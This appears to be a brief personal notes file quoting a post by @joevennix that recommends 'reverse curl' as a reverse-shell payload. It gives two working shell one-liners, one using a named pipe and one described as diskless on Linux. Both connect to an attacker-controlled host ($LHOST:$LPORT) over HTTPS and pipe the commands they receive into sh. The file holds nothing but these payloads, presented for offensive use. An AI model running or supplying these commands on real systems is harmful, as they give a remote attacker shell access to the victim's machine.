# notes

@joevennix writes:

````
reverse curl is a solid payload:

P=$(mktemp -u);mkfifo $P;curl -sNkT . https://$LHOST:$LPORT<$P|sh>$P

(diskless on linux):
  
{ curl -sNkT . https://$LHOST:$LPORT </dev/fd/3| sh 3>&-;} 3>&1|:
````
